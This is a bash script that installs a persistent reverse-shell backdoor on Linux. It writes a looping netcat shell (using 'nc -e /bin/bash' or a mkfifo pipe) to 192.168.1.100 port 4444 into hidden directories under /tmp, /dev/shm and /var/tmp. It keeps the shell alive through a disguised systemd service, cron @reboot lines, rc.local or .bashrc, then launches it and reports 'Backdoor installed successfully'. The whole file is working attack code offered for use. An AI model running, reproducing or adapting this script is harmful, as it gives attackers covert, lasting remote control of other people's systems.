#!/bin/bash

# Connection settings (Modify as needed)
service_name="fake_service"
host="192.168.1.100"
port="4444"

# Function to check if running as root
if [[ $EUID -eq 0 ]]; then
    systemd_path="/etc/systemd/system/$service_name.service"
    persistence_paths=("/etc/cron.d/$service_name" "/etc/rc.local")
    user_mode=0
else
    systemd_path="$HOME/.config/systemd/user/$service_name.service"
    persistence_paths=("$HOME/.config/crontab" "$HOME/.bashrc")
    mkdir -p "$(dirname "$systemd_path")"
    user_mode=1
fi

# Hidden script paths
hidden_dirs=("/tmp/.hidden" "/dev/shm/.cache" "/var/tmp/.logs")
hidden_script=""

# Select a random hidden directory
for dir in "${hidden_dirs[@]}"; do
    mkdir -p "$dir"
    chmod 700 "$dir"
    hidden_script="$dir/$service_name.sh"
    break
done

# Check if 'nc -e' is supported
if nc -h 2>&1 | grep -q -- "-e "; then
    shell_command="nc -e /bin/bash $host $port"
else
    shell_command="mkfifo /tmp/.backpipe; cat /tmp/.backpipe | /bin/bash -i 2>&1 | nc $host $port > /tmp/.backpipe"
fi

# Create the hidden persistence script
echo "#!/bin/bash
while true; do
    $shell_command
    sleep 5
done" > "$hidden_script"

# Make it executable
chmod +x "$hidden_script"

# Create systemd service file
echo "[Unit]
Description=$service_name
After=network.target

[Service]
Restart=always
ExecStart=/bin/bash -c '$hidden_script &'

[Install]
WantedBy=$( [[ $user_mode -eq 0 ]] && echo "multi-user.target" || echo "default.target")" > "$systemd_path"

# Enable and start the service
if [[ $user_mode -eq 0 ]]; then
    systemctl daemon-reload
    systemctl enable "$service_name.service"
    systemctl start "$service_name.service"
else
    systemctl --user daemon-reload
    systemctl --user enable "$service_name.service"
    systemctl --user start "$service_name.service"
fi

# Add multiple persistence methods
for path in "${persistence_paths[@]}"; do
    echo "@reboot $( [[ $user_mode -eq 0 ]] && echo "root" || echo "$USER") /bin/bash -c 'nohup $hidden_script &'" >> "$path"
done

chmod 644 "$systemd_path"

# Run the script immediately
nohup "$hidden_script" &

echo "✅ Backdoor installed successfully! Running as $( [[ $user_mode -eq 0 ]] && echo "root" || echo "user" )."
